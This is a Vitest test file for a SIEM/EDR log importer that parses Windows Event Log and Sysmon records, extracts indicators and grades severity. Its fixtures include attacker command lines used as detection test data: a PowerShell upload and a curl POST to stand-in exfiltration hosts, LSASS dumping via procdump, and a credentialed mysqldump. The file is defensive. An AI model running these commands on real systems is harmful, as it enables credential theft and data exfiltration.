import { describe, it, expect } from "vitest";
import { parseSiemExport, extractRecords, isSuspiciousCmd, cleanIp } from "../../src/analysis/siemImport.js";

// ── Representative Windows Event Log records (Elastic _source shape) ─────────────
const LOGON_4624 = {
  "@timestamp": "2017-03-20T06:33:40.262Z",
  log_name: "Security",
  source_name: "Microsoft-Windows-Security-Auditing",
  computer_name: "WINDMILLDC.windmill.local",
  event_id: 4624,
  level: "Information",
  event_data: { TargetUserName: "martin", TargetDomainName: "WINDMILL", LogonType: "3", IpAddress: "::ffff:10.10.200.11" },
};
const FAILED_4625 = {
  "@timestamp": "2017-03-20T06:40:00.000Z", log_name: "Security", computer_name: "WINDMILLDC",
  event_id: 4625, level: "Information",
  event_data: { TargetUserName: "admin", TargetDomainName: "WINDMILL", LogonType: "3", IpAddress: "10.10.200.50", Status: "0xc000006d" },
};
const SVC_7045 = {
  "@timestamp": "2017-03-20T10:00:00.000Z", log_name: "System", computer_name: "WINDMILLDC",
  event_id: 7045, level: "Information",
  event_data: { ServiceName: "EvilSvc", ServiceFileName: "C:\\Windows\\Temp\\evil.exe" },
};
const SYSMON_PROC = {
  "@timestamp": "2017-03-20T09:46:58.001Z",
  log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WINDMILLDC.windmill.local",
  event_id: 1, level: "Information",
  event_data: {
    UtcTime: "2017-03-20 09:46:58.000", Image: "C:\\Windows\\System32\\taskeng.exe",
    CommandLine: "taskeng.exe {GUID}", ParentImage: "C:\\Windows\\System32\\svchost.exe",
    ParentCommandLine: "svchost.exe -k netsvcs", User: "NT AUTHORITY\\SYSTEM",
    Hashes: "SHA1=6F6959BB113BACAF9D8336BA73F555D97A140085,MD5=7474098E40072B5C6C5D16B562AE81FF,SHA256=425A1A21A4DBC212C3C3DB5F8FECDD6235E7E7FE2FCFCE3AFFE3F9F80AA24A92,IMPHASH=C3B5EB32FB406506B162083DDB9FF480",
  },
};

function elastic(...sources: object[]): string {
  return JSON.stringify({ data: sources.map((s) => ({ _index: "win-2017", _type: "winevtx", _source: s })) });
}

describe("extractRecords — container unwrapping", () => {
  it("unwraps the Elastic/Kibana { data: [{ _source }] } envelope", () => {
    const { records, format } = extractRecords(elastic(LOGON_4624, FAILED_4625));
    expect(format).toBe("elastic-data");
    expect(records).toHaveLength(2);
    expect(records[0].event_id).toBe(4624);
  });
  it("unwraps an Elasticsearch { hits: { hits: [{ _source }] } } response", () => {
    const text = JSON.stringify({ hits: { hits: [{ _source: LOGON_4624 }] } });
    const { records, format } = extractRecords(text);
    expect(format).toBe("elastic-hits");
    expect(records[0].event_id).toBe(4624);
  });
  it("reads a plain JSON array", () => {
    const { records, format } = extractRecords(JSON.stringify([LOGON_4624, SVC_7045]));
    expect(format).toBe("array");
    expect(records).toHaveLength(2);
  });
  it("reads NDJSON (one object per line, _source-wrapped)", () => {
    const text = [JSON.stringify({ _source: LOGON_4624 }), JSON.stringify({ _source: FAILED_4625 })].join("\n");
    const { records, format } = extractRecords(text);
    expect(format).toBe("ndjson");
    expect(records).toHaveLength(2);
  });
  it("reads a { events: [...] } envelope", () => {
    const { records, format } = extractRecords(JSON.stringify({ events: [LOGON_4624] }));
    expect(format).toBe("events:events");
    expect(records).toHaveLength(1);
  });
  it("reads concatenated pretty-printed objects (Hayabusa json-timeline default — no array/commas)", () => {
    const text = `${JSON.stringify(LOGON_4624, null, 2)}\n${JSON.stringify(SVC_7045, null, 2)}\n`;
    const { records, format } = extractRecords(text);
    expect(format).toBe("concatenated-json");
    expect(records).toHaveLength(2);
    expect(records[0].event_id).toBe(4624);
  });
  it("does not misparse braces inside string values", () => {
    const rec = { msg: "value with } and { braces", event_id: 1 };
    const { records } = extractRecords(`${JSON.stringify(rec, null, 2)}\n${JSON.stringify(rec, null, 2)}`);
    expect(records).toHaveLength(2);
    expect(records[0].msg).toBe("value with } and { braces");
  });
});

describe("parseSiemExport — Windows Event Log mapping", () => {
  it("derives severity from the event type (4625→Medium, 7045→High, 4624→Low)", () => {
    const r = parseSiemExport(elastic(LOGON_4624, FAILED_4625, SVC_7045));
    const sev = Object.fromEntries(r.events.map((e) => [e.description.match(/EID (\d+)/)![1], e.severity]));
    expect(sev["4624"]).toBe("Low");
    expect(sev["4625"]).toBe("Medium");
    expect(sev["7045"]).toBe("High");
    // High sorts before Medium before Low.
    expect(r.events[0].description).toContain("7045");
  });

  it("reads the artifact's own time (Sysmon UtcTime / @timestamp), never the import time", () => {
    const r = parseSiemExport(elastic(SYSMON_PROC));
    expect(r.events[0].timestamp).toBe("2017-03-20T09:46:58.000Z"); // UtcTime, normalized to ISO Z
  });

  it("extracts IOCs: IP (unwrapping ::ffff:), SHA256 from the Sysmon Hashes string, process", () => {
    const r = parseSiemExport(elastic(LOGON_4624, SYSMON_PROC));
    const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
    expect(vals).toContain("ip:10.10.200.11");                  // ::ffff: prefix stripped
    expect(vals).toContain("hash:425a1a21a4dbc212c3c3db5f8fecdd6235e7e7fe2fcfce3affe3f9f80aa24a92");
    expect(vals).toContain("process:taskeng.exe");
  });

  it("scrapes URL / domain indicators embedded in a process command line (exfil / C2)", () => {
    const EXFIL = {
      "@timestamp": "2024-03-12T17:00:21.000Z",
      log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "FS-01.meridiancpa.com",
      event_id: 1, level: "Information",
      event_data: {
        UtcTime: "2024-03-12 17:00:21.000", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        CommandLine: "powershell.exe -nop -w hidden -c Invoke-RestMethod -Uri https://mft.brightparcel.io/u/inbox -Method Put -InFile C:\\Windows\\Temp\\rb-0312.zip",
        User: "MERIDIANCPA\\kevin.obrien",
      },
    };
    const r = parseSiemExport(elastic(EXFIL));
    const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
    expect(vals).toContain("url:https://mft.brightparcel.io/u/inbox"); // exfil URL now promoted to an IOC
    expect(vals).toContain("domain:mft.brightparcel.io");             // …and its domain
  });

  it("carries the host as the affected asset and renders DOMAIN\\user for the asset graph", () => {
    const r = parseSiemExport(elastic(LOGON_4624));
    expect(r.events[0].asset).toBe("WINDMILLDC.windmill.local");
    expect(r.events[0].description).toContain("WINDMILL\\martin");
  });

  it("sets sha256 + processName/parentName on Sysmon process-create events", () => {
    const r = parseSiemExport(elastic(SYSMON_PROC));
    const e = r.events[0];
    expect(e.sha256).toBe("425a1a21a4dbc212c3c3db5f8fecdd6235e7e7fe2fcfce3affe3f9f80aa24a92");
    expect(e.processName).toBe("taskeng.exe");
    expect(e.parentName).toBe("svchost.exe");
    // Field separator convention: fields are joined by " - " (never "|"), and ParentCommandLine
    // is part of the standard subject fields.
    expect(e.description).toContain("CommandLine=taskeng.exe {GUID}");
    expect(e.description).toContain("ParentCommandLine=svchost.exe -k netsvcs");
    expect(e.description).toContain(" - ");
    expect(e.description).not.toContain("|");
  });

  it("bumps a LOLBin / suspicious command-line process-create above the benign Low", () => {
    const susp = {
      "@timestamp": "2017-03-20T10:01:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 1, event_data: { Image: "C:\\Windows\\System32\\powershell.exe", CommandLine: "powershell -nop -w hidden -enc SQBFAFgA", ParentImage: "C:\\Office\\winword.exe" },
    };
    const r = parseSiemExport(elastic(susp));
    expect(["Medium", "High"]).toContain(r.events[0].severity);
  });

  it("downgrades benign CreateRemoteThread (Sysmon EID 8) from csrss/wininit to Low", () => {
    const benign = {
      "@timestamp": "2017-03-20T11:14:13Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 8, event_data: { SourceImage: "C:\\Windows\\System32\\csrss.exe", TargetImage: "C:\\Windows\\System32\\svchost.exe" },
    };
    const evil = {
      "@timestamp": "2017-03-20T11:15:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 8, event_data: { SourceImage: "C:\\Temp\\loader.exe", TargetImage: "C:\\Windows\\System32\\explorer.exe" },
    };
    const r = parseSiemExport(elastic(benign, evil));
    const byTarget = Object.fromEntries(r.events.map((e) => [e.description.match(/TargetImage=\S+\\(\S+)/)![1], e.severity]));
    expect(byTarget["svchost.exe"]).toBe("Low");   // csrss source → benign
    expect(byTarget["explorer.exe"]).toBe("High");  // unknown source → still flagged
  });

  it("downgrades benign Defender CreateRemoteThread (EID 8) to Low and drops T1055, but flags a masquerade", () => {
    const defender = {
      "@timestamp": "2024-03-18T11:00:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 8, event_data: { SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe", TargetImage: "C:\\Windows\\explorer.exe" },
    };
    const masq = {
      "@timestamp": "2024-03-18T11:01:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 8, event_data: { SourceImage: "C:\\Users\\Public\\svchost.exe", TargetImage: "C:\\Windows\\explorer.exe" },
    };
    const r = parseSiemExport(elastic(defender, masq));
    const def = r.events.find((e) => e.description.includes("MsMpEng.exe"))!;
    const mq = r.events.find((e) => e.description.includes("Public\\svchost.exe"))!;
    expect(def.severity).toBe("Low");
    expect(def.mitreTechniques).not.toContain("T1055");
    expect(mq.severity).toBe("High");   // masqueraded name from \Users\Public\
    expect(mq.mitreTechniques).toContain("T1055");
  });

  it("flags LSASS process-access (Sysmon EID 10) as High with credential-dumping MITRE", () => {
    const lsass = {
      "@timestamp": "2017-03-20T10:02:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 10, event_data: { SourceImage: "C:\\Temp\\mim.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1410" },
    };
    const r = parseSiemExport(elastic(lsass));
    expect(r.events[0].severity).toBe("High");
    expect(r.events[0].mitreTechniques).toContain("T1003.001");
  });

  it("downgrades benign LSASS access from Defender / core-OS processes to Low — #198", () => {
    const defender = {
      "@timestamp": "2024-03-18T10:00:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 10, event_data: { SourceImage: "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2\\MsMpEng.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1410" },
    };
    const svchost = {
      "@timestamp": "2024-03-18T10:01:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 10, event_data: { SourceImage: "C:\\Windows\\System32\\svchost.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1010" },
    };
    const r = parseSiemExport(elastic(defender, svchost));
    for (const e of r.events) {
      expect(e.severity).toBe("Low");
      expect(e.mitreTechniques).not.toContain("T1003.001");
    }
  });

  it("still flags a MASQUERADED benign name running LSASS access from a suspicious path as High — #198", () => {
    const masq = {
      "@timestamp": "2024-03-18T10:02:00Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS1",
      event_id: 10, event_data: { SourceImage: "C:\\Users\\Public\\svchost.exe", TargetImage: "C:\\Windows\\System32\\lsass.exe", GrantedAccess: "0x1410" },
    };
    const r = parseSiemExport(elastic(masq));
    expect(r.events[0].severity).toBe("High");
    expect(r.events[0].mitreTechniques).toContain("T1003.001");
  });

  it("grades a renamed LSASS dumper (by argument) as High — #199", () => {
    const dump = {
      "@timestamp": "2024-03-18T15:24:38Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
      event_id: 1, event_data: { Image: "C:\\Windows\\Temp\\wdi-svc.exe", CommandLine: "wdi-svc.exe -p lsass -o C:\\Windows\\Temp\\lsa.dmp", ParentImage: "C:\\Windows\\explorer.exe" },
    };
    const r = parseSiemExport(elastic(dump));
    expect(r.events[0].severity).toBe("High");
    expect(r.events[0].mitreTechniques).toContain("T1003");
  });

  it("bumps execution from a user-writable path (AppData) above benign Low — #199", () => {
    const dropper = {
      "@timestamp": "2024-03-18T14:17:07Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
      event_id: 1, event_data: { Image: "C:\\Users\\marcus.chen\\AppData\\Roaming\\Microsoft\\Libs\\brsvc.exe", CommandLine: "brsvc.exe --svc", ParentImage: "C:\\Users\\marcus.chen\\Downloads\\BrowserPlugin_v3.1.exe" },
    };
    const r = parseSiemExport(elastic(dropper));
    expect(r.events[0].severity).toBe("Medium");
  });

  it("does NOT over-grade a benign system-path recon command — #199", () => {
    const recon = {
      "@timestamp": "2024-03-18T14:24:38Z", log_name: "Microsoft-Windows-Sysmon/Operational", computer_name: "WS-DEV-01",
      event_id: 1, event_data: { Image: "C:\\Windows\\System32\\whoami.exe", CommandLine: "whoami /all", ParentImage: "C:\\Windows\\System32\\cmd.exe" },
    };
    const r = parseSiemExport(elastic(recon));
    expect(["Info", "Low"]).toContain(r.events[0].severity);
  });
});

describe("parseSiemExport — Kerberoasting / AS-REP roasting (RC4 ticket verdict)", () => {
  const roast4769 = (service: string, enc: string) => ({
    "@timestamp": "2024-05-01T12:00:00Z", log_name: "Security", computer_name: "DC01.corp.local",
    event_id: 4769, level: "Information",
    event_data: { TargetUserName: "attacker@CORP.LOCAL", ServiceName: service, TicketEncryptionType: enc, TicketOptions: "0x40810000", Status: "0x0", IpAddress: "10.0.0.66" },
  });

  it("grades an RC4 (0x17) TGS-REQ for a user service account as Medium T1558.003", () => {
    const r = parseSiemExport(elastic(roast4769("MSSQLSvc/db01.corp.local:1433", "0x17")));
    expect(r.events[0].severity).toBe("Medium");
    expect(r.events[0].mitreTechniques).toContain("T1558.003");
  });

  it("leaves RC4 TGS-REQ for a MACHINE account (name$) as Low with no roasting tag", () => {
    const r = parseSiemExport(elastic(roast4769("DC01$", "0x17")));
    expect(r.events[0].severity).toBe("Low");
    expect(r.events[0].mitreTechniques).not.toContain("T1558.003");
  });

  it("leaves an AES (0x12) TGS-REQ for a user service account as Low (not the RC4 tell)", () => {
    const r = parseSiemExport(elastic(roast4769("MSSQLSvc/db01.corp.local:1433", "0x12")));
    expect(r.events[0].severity).toBe("Low");
    expect(r.events[0].mitreTechniques).not.toContain("T1558.003");
  });

  it("grades an RC4 AS-REQ with pre-auth disabled (PreAuthType 0) as Medium T1558.004", () => {
    const asrep = {
      "@timestamp": "2024-05-01T12:05:00Z", log_name: "Security", computer_name: "DC01.corp.local",
      event_id: 4768, level: "Information",
      event_data: { TargetUserName: "svc_legacy", TargetDomainName: "CORP", TicketEncryptionType: "0x17", PreAuthType: "0", IpAddress: "10.0.0.66" },
    };
    const r = parseSiemExport(elastic(asrep));
    expect(r.events[0].severity).toBe("Medium");
    expect(r.events[0].mitreTechniques).toContain("T1558.004");
  });

  it("leaves a normal RC4 AS-REQ (PreAuthType 2) as Low — RC4 on a real logon is too common to flag", () => {
    const normal = {
      "@timestamp": "2024-05-01T12:06:00Z", log_name: "Security", computer_name: "DC01.corp.local",
      event_id: 4768, level: "Information",
      event_data: { TargetUserName: "alice", TargetDomainName: "CORP", TicketEncryptionType: "0x17", PreAuthType: "2", IpAddress: "10.0.0.20" },
    };
    const r = parseSiemExport(elastic(normal));
    expect(r.events[0].severity).toBe("Low");
    expect(r.events[0].mitreTechniques).not.toContain("T1558.004");
  });
});

describe("cleanIp — IPv6 shape validation (not just \"contains a colon\")", () => {
  it("rejects a free-text blob that merely contains colons as a bogus IPv6 IOC", () => {
    // A real observed case: a PowerShell cmdletization proxy-function dump (Get/Set-NetIPAddress
    // source) reached a field whose key loosely matched /ip|addr/i, and the old "v.includes(':')"
    // check accepted the WHOLE multi-KB blob as a "valid" IPv6 address.
    const blob = "$__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)";
    expect(cleanIp(blob)).toBe("");
  });
  it("rejects other colon-bearing non-IP text (timestamps, ratios, URLs sans scheme)", () => {
    expect(cleanIp("14:32:10")).toBe("");
    expect(cleanIp("ratio: 3:2:1")).toBe("");
    expect(cleanIp("C:\\Windows\\System32\\cmd.exe")).toBe("");
  });
  it("still accepts real IPv6 addresses, full and compressed forms", () => {
    expect(cleanIp("2001:0db8:85a3:0000:0000:8a2e:0370:7334")).toBe("2001:0db8:85a3:0000:0000:8a2e:0370:7334");
    expect(cleanIp("2001:db8::8a2e:370:7334")).toBe("2001:db8::8a2e:370:7334");
    expect(cleanIp("fe80::1")).toBe("");         // link-local excluded
    expect(cleanIp("::")).toBe("");               // unspecified, in NOISE_IP
  });
  it("still accepts IPv4 and strips the IPv4-mapped IPv6 prefix", () => {
    expect(cleanIp("10.0.0.5")).toBe("10.0.0.5");
    expect(cleanIp("::ffff:10.0.0.5")).toBe("10.0.0.5");
    expect(cleanIp("127.0.0.1")).toBe("");         // loopback, in NOISE_IP
  });
});

describe("isSuspiciousCmd — #199 tradecraft grading", () => {
  it("strong: a renamed LSASS dumper identified by its arguments", () => {
    expect(isSuspiciousCmd("C:\\Windows\\Temp\\wdi-svc.exe", "wdi-svc.exe -p lsass -o C:\\Windows\\Temp\\lsa.dmp")).toBe("strong");
    expect(isSuspiciousCmd("x.exe", "procdump64.exe -ma lsass.exe out.dmp")).toBe("strong");
  });
  it("weak: execution from a user-writable / staging path", () => {
    expect(isSuspiciousCmd("C:\\Users\\m\\AppData\\Roaming\\x.exe", "x.exe --svc")).toBe("weak");
    expect(isSuspiciousCmd("/tmp/payload", "/tmp/payload")).toBe("weak");
    // C:\ProgramData recurs as ransomware/dropper staging ground across the report corpus.
    expect(isSuspiciousCmd("C:\\ProgramData\\msidxsvc.exe", "msidxsvc.exe --svc")).toBe("weak");
  });
  it("weak: bulk DB dump + curl file upload (collection / exfil)", () => {
    expect(isSuspiciousCmd("/usr/bin/mysqldump", "mysqldump -u app -psecret prod customers payment_methods")).toBe("weak");
    expect(isSuspiciousCmd("/usr/bin/curl", "curl -X POST https://c2.example/api -F data=@/tmp/x.gz")).toBe("weak");
  });
  it("null: benign system binary running a benign command", () => {
    expect(isSuspiciousCmd("C:\\Windows\\System32\\whoami.exe", "whoami /all")).toBe(null);
    expect(isSuspiciousCmd("/usr/bin/id", "id")).toBe(null);
  });
});

describe("parseSiemExport — aggregation & volume", () => {
  it("collapses identical repetitive events into one counted row with a time range", () => {
    const copies = Array.from({ length: 5 }, (_, i) => ({
      ...LOGON_4624, "@timestamp": `2017-03-20T06:4${i}:00.000Z`,
    }));
    const r = parseSiemExport(elastic(...copies));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].count).toBe(5);
    expect(r.events[0].timestamp).toBe("2017-03-20T06:40:00.000Z");   // earliest
    expect(r.events[0].endTimestamp).toBe("2017-03-20T06:44:00.000Z"); // latest
    expect(r.total).toBe(5);
    expect(r.groups).toBe(1);
  });

  it("keeps distinct events (different user / source IP) separate", () => {
    const a = LOGON_4624;
    const b = { ...LOGON_4624, event_data: { ...LOGON_4624.event_data, TargetUserName: "alice" } };
    const r = parseSiemExport(elastic(a, b));
    expect(r.events).toHaveLength(2);
  });

  it("honors the maxEvents cap and reports dropped records", () => {
    const distinct = Array.from({ length: 10 }, (_, i) => ({ ...LOGON_4624, event_data: { ...LOGON_4624.event_data, TargetUserName: `u${i}` } }));
    const r = parseSiemExport(elastic(...distinct), { maxEvents: 3 });
    expect(r.events).toHaveLength(3);
    expect(r.dropped).toBe(7);
  });

  it("applies a minSeverity floor (drops Info-level logoff noise)", () => {
    const logoff = { "@timestamp": "t", log_name: "Security", computer_name: "H", event_id: 4634, event_data: { TargetUserName: "x" } };
    const all = parseSiemExport(elastic(logoff, FAILED_4625));
    expect(all.events).toHaveLength(2);
    const floored = parseSiemExport(elastic(logoff, FAILED_4625), { minSeverity: "Low" });
    expect(floored.events.map((e) => e.description.match(/EID (\d+)/)![1])).toEqual(["4625"]);
  });
});

describe("parseSiemExport — generic (non-Windows) SIEM/EDR fallback", () => {
  it("maps an arbitrary EDR record using field auto-detection (time/host/severity/message)", () => {
    const edr = {
      vendor: "CrowdStrike", "@timestamp": "2026-01-02T03:04:05Z", hostname: "LAPTOP-7",
      severity: "high", message: "Suspicious PowerShell execution detected",
      sha256: "a".repeat(64), dest_ip: "203.0.113.9",
    };
    const r = parseSiemExport(JSON.stringify([edr]));
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.severity).toBe("High");
    expect(e.asset).toBe("LAPTOP-7");
    expect(e.timestamp).toBe("2026-01-02T03:04:05Z");
    expect(e.description).toContain("CrowdStrike");
    expect(e.description).toContain("Suspicious PowerShell");
    const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
    expect(vals).toContain("hash:" + "a".repeat(64));
    expect(vals).toContain("ip:203.0.113.9");
  });

  it("scrapes indicators embedded in the free-text message, not just IP-named fields", () => {
    // An SSH auth line where the source IP lives INSIDE the message — no dedicated ip/src_ip field.
    // Without free-text scraping the IP shows in the timeline but never becomes an IOC.
    const ssh = {
      "@timestamp": "2024-05-14T14:20:09.941Z", host: "PROXY-BO-01",
      message: "Failed password for svc_mgmt from 10.44.20.20 port 52310 on PROXY-BO-01",
    };
    const r = parseSiemExport(JSON.stringify([ssh]));
    const vals = r.iocs.map((i) => `${i.type}:${i.value}`);
    expect(vals).toContain("ip:10.44.20.20");   // internal RFC1918 source kept
  });

  it("scrapes a URL/domain/hash from message text but skips internal .local hostnames", () => {
    const rec = {
      "@timestamp": "2024-05-14T14:20:09.941Z", host: "WS-1",
      message:
        "Download from http://evil.example.com/payload.bin sha256 " +
        "b".repeat(64) + " observed on WS-MPATEL-01.northstar-branch.local",
    };
    const vals = parseSiemExport(JSON.stringify([rec])).iocs.map((i) => `${i.type}:${i.value}`);
    expect(vals).toContain("url:http://evil.example.com/payload.bin");
    expect(vals).toContain("domain:evil.example.com");
    expect(vals).toContain("hash:" + "b".repeat(64));
    expect(vals.some((v) => v.includes(".local"))).toBe(false);   // AD hostname not flooded into IOCs
  });

  it("parses Kibana display-format timestamps (\"May 7, 2026 @ 16:31:04.000\") to UTC ISO", () => {
    const rec = { "@timestamp": "May 7, 2026 @ 16:31:04.000", host: "h", message: "x" };
    const e = parseSiemExport(JSON.stringify([rec])).events[0];
    expect(e.timestamp).toBe("2026-05-07T16:31:04.000Z");
  });

  it("maps a numeric risk score to a severity band", () => {
    const rec = { timestamp: "2026-01-01T00:00:00Z", host: "h", risk_score: 95, name: "Beacon" };
    const r = parseSiemExport(JSON.stringify([rec]));
    expect(r.events[0].severity).toBe("Critical");
  });

  it("uses `desc` as the description and `@timestamp` for time (Elastic mp_timeline push)", () => {
    // The flat shape the extension's Elastic adapter produces after unwrapping docvalue `fields`.
    const rec = {
      _id: "M_cWzJ4", _index: "mp_timeline", _version: 1, _ignored: "desc.keyword",
      "@timestamp": "2026-06-03T08:42:12.000Z",
      desc: "HKU\\S-1-5-21\\Software\\Trigona\\Wallpaper", action: "MOD", type: "REG",
    };
    const e = parseSiemExport(JSON.stringify([rec])).events[0];
    expect(e.timestamp).toBe("2026-06-03T08:42:12.000Z");
    expect(e.description).toContain("Trigona");
    expect(e.description).not.toContain("_index");
    expect(e.description).not.toContain("_ignored");
  });

  it("summarizes salient fields (not ES metadata) when there's no message field (DetectRaptor MFT)", () => {
    const rec = {
      _id: "x1", _index: "artifact_detectraptor_windows_detection_mft", _version: 1,
      "@timestamp": "2026-01-28T09:47:39.493Z",
      "Detection.StringHit": "PsExec.exe",
      "Detection.KeywordRegex": "psexec\\.exe$|psexec64\\.exe$|remcom\\.exe$",
      "Artifact.keyword": "DetectRaptor.Windows.Detection.MFT", "FlowId": "F.D7U8JESNJITC2",
    };
    const e = parseSiemExport(JSON.stringify([rec])).events[0];
    expect(e.timestamp).toBe("2026-01-28T09:47:39.493Z");
    expect(e.description).toContain("PsExec.exe");
    expect(e.description).not.toContain("_id=");
    expect(e.description).not.toContain("_version");
  });
});

describe("parseSiemExport — robustness", () => {
  it("returns an empty result for empty / non-JSON input without throwing", () => {
    expect(parseSiemExport("").total).toBe(0);
    expect(parseSiemExport("   ").events).toEqual([]);
    expect(parseSiemExport("not json at all").total).toBe(0);
  });
});
